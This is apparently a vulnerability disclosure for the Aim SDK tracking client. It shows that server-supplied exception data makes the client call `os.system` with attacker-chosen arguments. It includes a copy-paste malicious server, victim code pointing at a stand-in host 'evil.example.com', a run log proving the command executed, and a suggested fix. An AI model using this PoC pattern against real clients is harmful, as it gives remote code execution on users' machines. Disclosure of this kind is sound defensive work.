# Aim SDK client: server-controlled exception reconstruction executes arbitrary callables on the client (RCE)

**Upstream issue:** https://github.com/aimhubio/aim/issues/3421

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04 against a mock malicious tracking server; output below is from the actual run)

## Reproduction conditions

- aim 3.29.1 (pip), Python 3.11, Ubuntu 24.04 — plain `from aim.ext.transport.client import Client`
- A malicious, compromised, or man-in-the-middle tracking server. The client probes plain HTTP before HTTPS (`Client.protocol_probe`), so an on-path attacker on an untrusted network can also impersonate the server.

## Description

`raise_exception()` in `aim/ext/transport/message_utils.py:54-66` reconstructs a server-provided exception on the client without any allowlist:

```python
module = importlib.import_module(server_exception.get('module_name'))
exception = getattr(module, server_exception.get('class_name'))
args = json.loads(server_exception.get('args') or [])
raise exception(*args) if args else exception()
```

`module_name`, `class_name` and `args` come entirely from the tracking server's error response — no module allowlist, no check that the target is an `Exception` subclass. With `module_name="os"`, `class_name="system"` the call `exception(*args)` **is** `os.system(args)` — the command runs before the subsequent `raise` fails with `TypeError`. This path runs on every client error handler (`get_resource_handler`, `release_resource`, `_run_read_instructions`, `_run_write_instructions` in `aim/ext/transport/client.py`) whenever the server answers HTTP 400 with an `exception` payload.

## Impact

A malicious, compromised, or man-in-the-middle tracking server achieves arbitrary code execution on every client that connects to it. Team-shared central tracking servers are the documented deployment model — compromising (or impersonating) one server fans out to all members' training machines.

## PoC (copy-paste ready)

**Step 1 — evil tracking server** (any HTTP server answering `GET /status/` with 200 for the protocol probe, and every RPC POST with the crafted 400):

```python
import json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

class EvilHandler(BaseHTTPRequestHandler):
    def log_message(self, *a): pass

    def do_GET(self):                       # satisfy Client.protocol_probe
        self.send_response(200); self.end_headers(); self.wfile.write(b"{}")

    def do_POST(self):
        body = json.dumps({"exception": {
            "module_name": "os", "class_name": "system",
            "args": json.dumps(["id > /tmp/aim3421_proof"]),
            "message": "boom"}}).encode()
        self.send_response(400)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 53901), EvilHandler).serve_forever()
```

**Step 2 — victim (any machine pointing its aim client at the evil server):**

```python
from aim.ext.transport.client import Client
client = Client("evil.example.com:53901")   # or aim:// URI of the compromised server
try:
    client.get_resource_handler(None, "Repo", args=b"")
except BaseException:
    pass
```

**Step 3 — verify:** `/tmp/aim3421_proof` exists on the *client* host and contains the `id` output.

## Execution result (actual run: aim 3.29.1 / Python 3.11 / Ubuntu 24.04)

```
[evil-server] listening on 127.0.0.1:53901
[victim] caught: TypeError('exceptions must derive from BaseException')
[PROOF] command executed on client host, output of id():
uid=1000(iot) gid=1000(iot) groups=1000(iot),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),988(docker)
[RESULT] REPRODUCED
```

The command ran on the client host inside `raise exception(*args)` — the "constructor" was `os.system`, whose side effect executed before the raise itself failed with `TypeError`.

## Suggested fix

Restrict reconstruction to an allowlisted set of exception types (e.g. map server error codes to client exception classes locally); never `importlib.import_module` a server-supplied module name, and verify the resolved object is an `Exception` subclass before calling it.
